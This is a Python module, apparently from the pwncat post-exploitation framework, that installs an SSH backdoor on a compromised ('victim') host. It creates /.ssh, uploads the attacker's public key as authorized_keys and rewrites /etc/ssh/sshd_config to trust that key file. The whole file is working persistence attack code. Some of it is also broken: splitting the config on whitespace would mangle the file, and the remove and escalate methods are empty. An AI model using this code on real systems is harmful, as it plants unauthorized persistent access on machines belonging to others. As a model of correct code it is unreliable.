#!/usr/bin/env python3
import os
import re
import shutil
from typing import Optional

import pwncat
from pwncat.persist import PersistenceMethod, PersistenceError
from pwncat.util import Access


class Method(PersistenceMethod):

    system = True
    local = True
    name = "sshd"

    def install(self, user: Optional[str] = None):
        """ Install SSHD backdoor persistence """

        # Read the remote sshd config
        try:
            with pwncat.victim.open("/etc/ssh/sshd_config", "r") as filp:
                config = filp.read()
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistenceError(str(exc))

        # We need to be able to create a directory in the root of the filesystem
        access = pwncat.victim.access("/.ssh")
        if Access.PARENT_WRITE not in access:
            raise PersistenceError("unable to create key directory")

        # Create the directory
        pwncat.victim.env(["mkdir", "-p", "/.ssh"])

        # Grab the path to the public key
        pubkey = pwncat.victim.config["privkey"] + ".pub"

        try:
            # Upload the public key
            with open(pubkey, "r") as srcf:
                with pwncat.victim.open(
                    "/.ssh/authorized_keys", "w", length=os.path.getsize(pubkey)
                ) as destf:
                    shutil.copyfileobj(srcf, destf)
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistenceError(str(exc))

        # Anyone can read, only root can write
        pwncat.victim.env(["chmod", "404", "/.ssh/authorized_keys"])

        lines = []
        for line in config.split():
            if re.match(f"\s*AuthorizedKeysFile\s+", line):
                lines.append("#" + line)
                lines.append("AuthorizedKeysFile /.ssh/authorized_keys")
            else:
                lines.append(line)

        content = "\n".join(lines)
        try:
            with pwncat.victim.open(
                "/etc/ssh/sshd_config", "w", length=len(content)
            ) as filp:
                filp.write(content)
        except (FileNotFoundError, PermissionError) as exc:
            # Undo what we did
            pwncat.victim.env(["rm", "-rf", "/.ssh"])
            raise PersistenceError(str(exc))

    def remove(self, user: Optional[str] = None):
        """ Remove SSHD backdoor persistence """

    def escalate(self, user: Optional[str] = None) -> bool:
        """ Login as the specified user with this persistence """
